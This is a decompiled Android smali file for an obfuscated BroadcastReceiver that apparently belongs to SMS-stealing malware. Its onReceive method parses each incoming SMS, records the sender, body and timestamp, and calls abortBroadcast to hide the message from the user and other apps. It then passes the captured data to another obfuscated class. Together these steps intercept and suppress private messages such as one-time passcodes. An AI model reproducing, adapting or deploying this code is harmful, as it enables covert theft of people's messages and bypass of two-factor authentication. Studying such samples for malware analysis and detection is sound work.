.class public final Lcom/boJUF/mB/mB/pO/JO/tP/Ke;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field private LA:Lcom/boJUF/mB/mB/pO/JO/tP/uI;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-direct {v0, p1}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ke;->LA:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/boJUF/mB/mB/pO/tP/oC;->LA()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_0
    new-instance v3, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-direct {v3}, Lcom/boJUF/mB/mB/pO/mB/XQ;-><init>()V

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v4, v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v4, :cond_0

    aget-object v1, v0, v2

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v3, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v3, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v5

    iput-wide v5, v3, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J

    invoke-virtual {p0}, Lcom/boJUF/mB/mB/pO/JO/tP/Ke;->abortBroadcast()V

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ke;->LA:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-virtual {v1, v3}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->On(Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_0

    :catch_0
    move-exception v0

    :cond_0
    return-void
.end method
